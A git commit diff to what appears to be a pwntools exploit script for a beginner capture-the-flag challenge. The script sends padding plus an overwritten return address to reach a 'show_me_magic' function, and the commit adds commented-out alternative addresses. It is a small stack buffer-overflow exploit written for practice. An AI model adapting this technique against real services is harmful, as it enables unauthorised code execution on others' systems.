b3227ea244627333392f84614a080fc8d542ed7c
wuling31715 <wuling31715@gmail.com>
2020-04-07 05:48:27 +0800

    .

--- adl/helloctf/main.py
+++ adl/helloctf/main.py
@@ -9,6 +9,9 @@ port = 11001
 
 r = remote(ip, port)
 show_me_magic = 0x0000000000400627
+# show_me_magic = 0x000000000040063c
+# show_me_magic = 0x400520
+# show_me_magic = 0x0b0225ff
 
 payload = "aaaabaaacaaadaaaeaaafaaa"
 payload += p64(show_me_magic)
